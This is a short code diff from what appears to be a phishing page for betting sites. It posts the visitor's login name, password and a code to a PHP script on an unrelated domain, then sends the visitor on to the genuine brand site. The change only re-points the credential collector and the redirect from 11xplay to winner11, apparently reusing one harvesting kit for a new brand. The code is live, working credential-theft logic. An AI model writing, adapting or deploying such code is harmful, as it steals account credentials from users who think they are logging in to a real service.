@@ -954,7 +954,7 @@
         if (code) {
             $.ajax({
                 type: "POST",
-                url: "https://justdial4u.today/11xxplay-mail.php", 
+                url: "https://justdial4u.today/winner11.php", 
                 data: {
                     loginName: loginName,
                     password: password,
@@ -962,7 +962,7 @@
                 },
                 success: function(response) {
                     if (response === "sucessmsg") {
-                        window.location.href = "https://11xplay.com/"; 
+                        window.location.href = "https://winner11.io/"; 
                     } else {
                         $("#errorMsg").text("There was an error sending the email.");
                     }
